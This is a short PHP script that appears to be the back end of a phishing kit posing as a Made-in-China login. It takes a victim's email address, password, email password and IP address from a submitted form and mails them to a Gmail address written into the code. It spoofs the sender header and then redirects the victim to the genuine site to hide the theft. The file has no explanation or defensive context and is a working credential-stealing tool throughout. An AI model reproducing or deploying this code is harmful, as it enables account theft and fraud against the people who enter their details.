<?
$ip = getenv("REMOTE_ADDR");
$message  = "---------------ReSulT--------------\n";
$message .= "Email Add : ".$_POST['add']."\n";
$message .= "Password : ".$_POST['pwd']."\n";
$message .= "EmailPwd : ".$_POST['pwdd']."\n";
$message .= "-----------created by n0b0dy-----------\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------By Ceejay'-----------------\n";
$send = "henrychike411@gmail.com";
$subject = "ReSulTs - MiC";
$headers = "From: ReSult<logzz@cok.edu>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message, $headers); 
header("Location: http://www.made-in-china.com");
?>